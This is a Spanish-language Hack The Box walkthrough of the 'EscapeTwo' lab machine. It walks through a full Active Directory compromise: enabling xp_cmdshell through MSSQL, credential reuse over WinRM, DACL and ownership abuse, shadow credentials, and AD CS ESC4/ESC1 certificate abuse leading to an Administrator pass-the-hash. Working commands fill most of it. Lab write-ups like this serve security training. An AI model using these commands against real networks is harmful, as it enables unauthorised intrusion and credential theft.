# EscapeTwo

<figure><img src="htb/img/EscapeTwo/EscapeTwo.png" alt=""><figcaption></figcaption></figure>

## Enumeración

### Nmap

```bash
PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack ttl 127
88/tcp    open  kerberos-sec  syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
389/tcp   open  ldap          syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
464/tcp   open  kpasswd5      syn-ack ttl 127
636/tcp   open  ldapssl       syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127
3268/tcp  open  globalcatLDAP syn-ack ttl 127
5985/tcp  open  wsman         syn-ack ttl 127
9389/tcp  open  adws          syn-ack ttl 127
47001/tcp open  winrm         syn-ack ttl 127
49665/tcp open  unknown       syn-ack ttl 127
49666/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49689/tcp open  unknown       syn-ack ttl 127
49690/tcp open  unknown       syn-ack ttl 127
49691/tcp open  unknown       syn-ack ttl 127
49722/tcp open  unknown       syn-ack ttl 127
49743/tcp open  unknown       syn-ack ttl 127
49804/tcp open  unknown       syn-ack ttl 127
56893/tcp open  unknown       syn-ack ttl 127
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-22 21:34:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-22T21:35:40+00:00; +1m22s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-22T21:35:40+00:00; +1m22s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-04-22T21:35:40+00:00; +1m22s from scanner time.
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-04-22T16:34:27
|_Not valid after:  2055-04-22T16:34:27
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-04-22T21:35:40+00:00; +1m22s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49743/tcp open  msrpc         Microsoft Windows RPC
49804/tcp open  msrpc         Microsoft Windows RPC
56893/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### SMB

Al entrar al smb con las credenciales que nos dan, `rose` / `KxEPkKe6R8su` , podemos encontrar un recurso compartido llamado Accounting Department, en el que hay 2 archivos .xlsx (excel).

```bash
smbmap -H sequel.htb -u 'rose' -p 'KxEPkKe6R8su'
```

<figure><img src="htb/img/EscapeTwo/EscapeTwo2.png" alt=""><figcaption></figcaption></figure>

```bash
smbclient //10.10.11.51/"Accounting Department" -U rose
```

<figure><img src="htb/img/EscapeTwo/EscapeTwo3.png" alt=""><figcaption></figcaption></figure>

SI intentamos abrir los archivos excel nos va a poner que estan corruptos, con lo cual no nos da información.

Los archivos excel son en verdad archivos comprimidos con mas archivos dentro, asi que, podemos meternos a mirar dentro a ver si alguno nos da algun tipo de información valiosa.

Si entramos al excel `accounts.xlsx` podemos encontrar un archivo llamado `SharedStrings.xml` .&#x20;

Este archivo contiene lo que parece ser cuatro 4 usuarios con sus usernames y contraseñas. Si lo representamos en formato tabla quedaría así

<table><thead><tr><th width="114">First Name</th><th width="114">Last Name</th><th>Email</th><th width="130">Username</th><th>Password</th></tr></thead><tbody><tr><td>Angela</td><td>Martin</td><td>angela@sequel.htb</td><td>angela</td><td>0fwz704mSpurtI9g</td></tr><tr><td>Oscar</td><td>Martinez</td><td>oscar@sequel.htb</td><td>oscar</td><td>86LxLBMgEwAKUnBG</td></tr><tr><td>Kevin</td><td>Malone</td><td>kevin@sequel.htb</td><td>kevin</td><td>Md9W1q1E5bZnVvDo</td></tr><tr><td>NULL</td><td>sa</td><td>sa@sequel.htb</td><td>sa</td><td>MSSQLP@ssw0rd!</td></tr></tbody></table>

## Explotación

### Microsoft SQL

Si probamos los usuarios y las contraseñas en el servicio de Microsoft SQL podemos ver que el usuario `sa` **es valido. Con el siguiente comando podemos acceder:**

```bash
impacket-mssqlclient 'sa:MSSQLP@ssw0rd!'@10.10.11.51
```

Ahora que tenemos acceso a la consola de Microsoft SQL podemos buscar como lograr ejecutar comandos de la cmd, se hace de la siguiente manera:

```sql
exec xp_cmdshell "whoami"
```

Si intentamos este comando veremos que no nos deja ya que "sys.xp\_cmdshell" está desactivado.&#x20;

<figure><img src="htb/img/EscapeTwo/EscapeTwo4.png" alt=""><figcaption></figcaption></figure>

Si buscamos como activarlo encontraremos el siguiente comando.

```sql
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Si lo ejecutamos y luego volvemos a ejecutar el comando anterior veremos que ahora si funciona.

<figure><img src="htb/img/EscapeTwo/EscapeTwo5.png" alt=""><figcaption></figcaption></figure>

Si enumeramos un poco el sistema podemos encontrar 2 cosas clave:

1. En `C:\Users` existe un usuario `ryan`
2. que en esta carpeta `C:\SQL2019\ExpressAdv_ENU\` hay un archivo llamado `sql-Configuration.INI` .

Si le hacemos un type al archivo podemos ver el usuario y contraseña de lo que parece ser el usuario SQL-SVC

<figure><img src="htb/img/EscapeTwo/EscapeTwo6.png" alt=""><figcaption></figcaption></figure>

Si probamos esa contraseña con todos los usuarios que nos hemos encontrado podemos ver que la contraseña coincide en el servicio smb con el usuario ryan (usuario encontrado en C:\Users).

<figure><img src="htb/img/EscapeTwo/EscapeTwo7.png" alt=""><figcaption></figcaption></figure>

Podemos intentar ver si también tiene acceso al remote management

<figure><img src="htb/img/EscapeTwo/EscapeTwo8.png" alt=""><figcaption></figcaption></figure>

Y efectivamente podemos conseguir una shell como el usuario ryan usando esas credenciales.

```bash
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

En su desktop podremos encontrar la user

<figure><img src="htb/img/EscapeTwo/EscapeTwo9.png" alt=""><figcaption></figcaption></figure>

## Escalada

Si abrimos bloodhound con las credenciales de ryan podemos observar como ryan tiene el permiso `WriteOwner` a CA\_SVC. Con este permiso podemos modificar el propietario del usuario victima con el siguiente comando:

```bash
bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
```

<figure><img src="htb/img/EscapeTwo/EscapeTwo10.png" alt=""><figcaption></figcaption></figure>

Ahora que somos propietarios de su usuario podemos ponerle Full Control a ca\_svc:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

<figure><img src="htb/img/EscapeTwo/EscapeTwo11.png" alt=""><figcaption></figcaption></figure>

Ahora que el usuario tiene control total, podemos realizar un Shadow Credential Attack para insertar un certificado malicioso y obtener un TGT de Kerberos, que se guarda en un archivo `.ccache`.

Este archivo puede pasarse a Certipy para autenticarte como la cuenta víctima y buscar vulnerabilidades en las distintas plantillas de certificados del Active Directory con el siguiente comando:

```
KRB5CCNAME=$PWD/ca_svc.ccache certipy find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
```

<figure><img src="htb/img/EscapeTwo/EscapeTwo12.png" alt=""><figcaption></figcaption></figure>

Como podemos ver aparece la vulnerabilidad `ESC4` en la plantilla `DunderMifflinAuthentication`&#x20;

El ESC4 consiste en que el usuario tiene privilegios sobre la plantilla y gracias a eso podemos convertir ese ESC4 en ESC1 de la siguiente manera:\\

```bash
KRB5CCNAME=$PWD/ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -target dc01.sequel.htb
```

Ahora la plantilla es vulnerable a ESC1. Esta vulnerabilidad nos permite impersonar a otros usuarios y obtener un certificado como si fuéramos ellos.

En resumen, podemos pedir un certificado especificando manualmente un campo como el correo electrónico (`Subject` o `SAN`) y, si la plantilla está mal configurada, el servidor de certificados no valida si realmente somos ese usuario.

Por ejemplo, si cambiamos temporalmente el correo de nuestra cuenta a `Administrator@sequel.htb` y solicitamos un certificado, la CA nos lo emite creyendo que somos el administrador, simplemente porque se fía del valor que hemos enviado.\\

```bash
certipy req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -target sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -ca sequel-DC01-CA -dc-ip 10.10.11.51
```

> el hash lo sacamos de cuando hicimos el Shadow Credential Attack.

Una vez hacemos eso tendremos el .pfx del administrador. Un .pfx es un archivo que contiene un certificado digital y su clave privada. Este pfx se lo podemos pasar el certipy y hacer que nos devuelva el hash NTLM de la siguiente manera:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
```

<figure><img src="htb/img/EscapeTwo/EscapeTwo13.png" alt=""><figcaption></figcaption></figure>

Ahora con ese hash NTLM podemos entrar con evil-winrm a una shell del usuario

```bash
evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

<figure><img src="htb/img/EscapeTwo/EscapeTwo14.png" alt=""><figcaption></figcaption></figure>

Y ya tenemos la root. Gracias por leer!&#x20;
